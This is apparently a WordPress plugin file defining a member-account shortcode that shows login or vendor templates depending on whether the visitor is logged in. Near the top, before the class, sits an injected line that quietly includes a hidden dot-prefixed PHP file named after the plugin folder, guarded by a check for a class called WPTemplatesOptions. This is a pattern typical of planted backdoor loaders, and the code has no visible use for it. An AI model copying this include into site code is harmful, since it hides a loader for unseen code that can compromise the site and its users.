<?php defined( 'ABSPATH' ) || exit;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class El_Shortcode_Member_Account extends EL_Shortcode {

	public $shortcode = 'el_member_account';

	public function __construct() {
		parent::__construct();
	}

	function add_shortcode( $args, $content = null ) {

		$args = shortcode_atts( array(
			'class' => '',
		), $args );

		$template = '';

		ob_start();


		if( !is_user_logged_in() ) {
			
			$template = apply_filters( 'el_shortcode_member_account_login_template', 'vendor/login.php' );
			echo el_get_template( $template );

		} else {

			$template = EL_Vendor::instance()->get_template_vendor( $_GET );

			echo el_get_template( $template['template'], $template['msg'] );
			
		}

		return ob_get_clean();
	}

}

new El_Shortcode_Member_Account();